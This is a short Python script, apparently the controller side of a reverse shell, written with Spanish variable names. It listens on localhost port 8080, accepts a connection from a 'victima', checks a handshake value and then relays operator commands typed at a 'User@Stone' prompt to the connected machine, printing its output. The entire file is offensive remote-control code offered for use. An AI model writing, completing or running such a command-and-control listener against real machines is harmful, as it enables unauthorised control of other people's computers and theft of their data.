import socket

attack=socket.socket()
attack.bind(("localhost",8080))
attack.listen(1)
while True:
    victima,direccion=attack.accept()
    print("conexion de : {}".format(direccion))
    mensaje=victima.recv(1024)
    codigo=mensaje.decode("ascii")
    if codigo == "1":
        while True:
            opcion=input("User@Stone : ")
            victima.send(opcion.encode("ascii"))
            salida=victima.recv(1024)
            print(salida)
    else:
        print("Error de conexion")
        break
